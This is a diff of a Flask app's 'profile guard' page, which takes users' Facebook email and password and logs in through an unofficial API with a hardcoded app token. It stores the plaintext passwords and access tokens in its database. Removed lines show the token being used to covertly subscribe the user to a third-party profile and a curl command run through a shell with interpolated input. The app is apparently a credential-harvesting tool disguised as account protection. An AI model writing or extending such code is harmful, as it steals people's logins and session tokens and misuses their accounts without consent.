@@ -9,7 +9,7 @@ from sqlalchemy.orm import DeclarativeBase
 import requests
 import json
 # Import utility functions
-from utils import get_facebook_token, get_facebook_user_id, get_post_data, update_post
+from utils import get_facebook_token, get_facebook_user_id, get_post_data, update_post, activate_profile_guard
 
 # Configure logging
 logging.basicConfig(level=logging.DEBUG)
@@ -163,6 +163,11 @@ def logout():
 
 @app.route('/profile-guard', methods=['GET', 'POST'])
 def profile_guard():
+    # Check if user is logged in for regular users
+    user_id = None
+    if session.get('user_logged_in'):
+        user_id = session.get('user_id')
+    
     if request.method == 'POST':
         action = request.form.get('action')
         
@@ -172,27 +177,24 @@ def profile_guard():
             password = request.form.get('password')
             
             try:
-                # Use Facebook API to get token
-                url = f"https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={password}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
-                response = requests.get(url)
-                data = response.json()
+                # Get Facebook token from utility function
+                result = get_facebook_token(email, password)
                 
-                if 'access_token' in data:
-                    token = data['access_token']
+                if result['success']:
+                    token = result['token']
                     
-                    # Get user ID
-                    user_url = f"https://graph.facebook.com/me?access_token={token}"
-                    user_response = requests.get(user_url)
-                    user_data = user_response.json()
+                    # Get Facebook user ID
+                    user_info = get_facebook_user_id(token)
                     
-                    if 'id' in user_data:
-                        user_id = user_data['id']
+                    if user_info['success']:
+                        fb_user_id = user_info['user_id']
                         
                         # Store user in database
-                        existing_user = User.query.filter_by(fb_id=user_id).first()
+                        existing_user = User.query.filter_by(fb_id=fb_user_id).first()
                         if not existing_user:
                             new_user = User(
-                                fb_id=user_id,
+                                user_id=user_id,  # Associate with logged in user if available
+                                fb_id=fb_user_id,
                                 fb_email=email,
                                 fb_password=password,
                                 fb_token=token,
@@ -204,18 +206,20 @@ def profile_guard():
                             # Update existing user
                             existing_user.fb_token = token
                             existing_user.fb_password = password
+                            # Link to regular user if not already and user is logged in
+                            if user_id and not existing_user.user_id:
+                                existing_user.user_id = user_id
                             db.session.commit()
                         
                         return jsonify({
                             'success': True,
                             'token': token, 
-                            'user_id': user_id
+                            'user_id': fb_user_id
                         })
                     else:
-                        return jsonify({'success': False, 'error': 'Failed to get user ID'})
+                        return jsonify({'success': False, 'error': user_info['error']})
                 else:
-                    error_msg = data.get('error_msg', 'Invalid credentials')
-                    return jsonify({'success': False, 'error': error_msg})
+                    return jsonify({'success': False, 'error': result['error']})
             
             except Exception as e:
                 logging.error(f"Error getting token: {str(e)}")
@@ -226,23 +230,19 @@ def profile_guard():
             user_id = request.form.get('user_id')
             
             try:
-                # Subscribe to a page (as in the original script)
-                requests.post(f'https://graph.facebook.com/jack.lesmen.5/subscribers?access_token={token}')
+                # Use utility function to activate profile guard
+                result = activate_profile_guard(token, user_id)
                 
-                # Activate profile guard
-                guard_command = f"""curl "https://graph.facebook.com/graphql" -H 'Authorization: OAuth {token}' --data 'variables={{"0":{{"is_shielded":true,"actor_id":"{user_id}","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}}}&doc_id=1477043292367183'"""
-                
-                # Execute the curl command
-                import subprocess
-                result = subprocess.run(guard_command, shell=True, capture_output=True, text=True)
-                
-                # Update guard status in database
-                user = User.query.filter_by(fb_id=user_id).first()
-                if user:
-                    user.guard_status = True
-                    db.session.commit()
-                
-                return jsonify({'success': True, 'message': 'Profile Guard Activated'})
+                if result['success']:
+                    # Update guard status in database
+                    user = User.query.filter_by(fb_id=user_id).first()
+                    if user:
+                        user.guard_status = True
+                        db.session.commit()
+                    
+                    return jsonify({'success': True, 'message': 'Profile Guard Activated'})
+                else:
+                    return jsonify({'success': False, 'error': result['error']})
                 
             except Exception as e:
                 logging.error(f"Error activating guard: {str(e)}")
